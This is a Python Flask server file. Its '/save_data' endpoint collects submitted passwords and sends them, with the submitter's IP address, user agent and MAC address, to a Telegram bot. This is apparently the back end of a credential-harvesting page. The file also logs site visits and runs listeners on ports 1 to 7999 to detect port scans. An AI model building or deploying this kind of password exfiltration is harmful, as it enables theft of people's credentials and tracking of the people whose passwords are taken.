from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
from dotenv import load_dotenv
import os
import subprocess
import threading
import socket
import time
from collections import defaultdict

load_dotenv('C:/Users/Emir/Music/check/.env')

print(f"BOT_TOKEN: {os.getenv('BOT_TOKEN')}")
print(f"CHAT_ID: {os.getenv('CHAT_ID')}")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise ValueError("BOT_TOKEN or CHAT_ID is missing. Check your .env file.")

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Dictionary to track port scanning attempts
scan_attempts = defaultdict(list)  # Format: {"IP": [timestamp, port]}

def get_mac_address(ip):
    """Get MAC address of a device based on its IP (local testing only)."""
    try:
        result = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if ip in line:
                    return line.split()[1]  # Extract MAC address
    except Exception as e:
        print(f"Error getting MAC address: {e}")
    return "Unknown MAC"

def send_telegram_message(message):
    """Send a message to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            print(f"Failed to send Telegram message: {response.text}")
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

def detect_port_scan(ip, port):
    """Detect port scanning by monitoring multiple port access attempts."""
    timestamp = datetime.now()
    scan_attempts[ip].append((timestamp, port))

    # Remove old entries (older than 60 seconds)
    scan_attempts[ip] = [
        (t, p) for t, p in scan_attempts[ip]
        if (datetime.now() - t).seconds <= 60
    ]

    # If the same IP accesses more than 5 ports within 60 seconds, notify
    if len(scan_attempts[ip]) > 5:
        ports = [p for _, p in scan_attempts[ip]]
        mac_address = get_mac_address(ip)
        message = (
            f"🚨 *Port Scanning Detected*:\n"
            f"🌍 IP Address: `{ip}`\n"
            f"🔗 MAC Address: `{mac_address}`\n"
            f"🔍 Ports Accessed: `{ports}`"
        )
        send_telegram_message(message)
        print(f"Port scanning detected from IP: {ip}")

def port_listener(port):
    """Start a listener on a specific port."""
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('0.0.0.0', port))
                server_socket.listen(5)
                print(f"Listening on port {port}...")
                while True:
                    conn, addr = server_socket.accept()
                    ip, _ = addr
                    print(f"Connection attempt from {ip} on port {port}")
                    detect_port_scan(ip, port)
                    conn.close()
        except Exception as e:
            print(f"Error on port {port}: {e}")
            time.sleep(1)  # Retry after a short delay


@app.route('/save_data', methods=['POST'])
def save_data():
    """Handle password submissions."""
    try:
        data = request.json
        password = data.get('password', '')
        if not password:
            raise ValueError("Password is missing.")

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        mac_address = get_mac_address(ip_address)

        message = (
            f"🔐 *Login Attempt Detected*:\n"
            f"🕒 Timestamp: `{timestamp}`\n"
            f"🌍 IP Address: `{ip_address}`\n"
            f"📱 User-Agent: `{user_agent}`\n"
            f"🔑 Password: `{password}`\n"
            f"🔗 MAC Address: `{mac_address}`"
        )
        send_telegram_message(message)

        return jsonify({"status": "success", "message": "Password saved and notification sent"}), 200
    except Exception as e:
        print(f"Error in save_data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/notify_visit', methods=['POST'])
def notify_visit():
    """Notify Telegram about site visits."""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        mac_address = get_mac_address(ip_address)

        message = (
            f"🌐 *Website Visit Detected*:\n"
            f"🕒 Timestamp: `{timestamp}`\n"
            f"🌍 IP Address: `{ip_address}`\n"
            f"📱 User-Agent: `{user_agent}`\n"
            f"🔗 MAC Address: `{mac_address}`"
        )
        send_telegram_message(message)

        return jsonify({"status": "success", "message": "Visit notification sent"}), 200
    except Exception as e:
        print(f"Error in notify_visit: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == '__main__':
    # Start port listeners on a range of ports
    ports_to_monitor = [port for port in range(1, 8000) if port != 5000]
    for port in ports_to_monitor:
        threading.Thread(target=port_listener, args=(port,), daemon=True).start()

    app.run(debug=True, host='0.0.0.0', port=5000)